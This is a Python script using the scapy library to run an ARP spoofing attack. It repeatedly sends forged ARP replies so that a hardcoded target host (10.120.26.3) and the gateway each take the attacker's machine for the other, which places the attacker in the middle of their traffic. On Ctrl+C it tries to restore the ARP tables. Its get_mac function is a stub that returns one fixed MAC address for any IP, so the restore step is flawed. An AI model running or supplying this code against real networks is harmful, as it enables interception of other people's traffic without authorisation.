#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
	base_id = "10.120.26."

	return "04:d4:c4:57:73:43"


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.120.26.3"
gateway_ip = "10.120.0.254"
try:
    send_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count += 2
        print(" \r[+] Packets sent: " + str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...."
          "Resetting ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
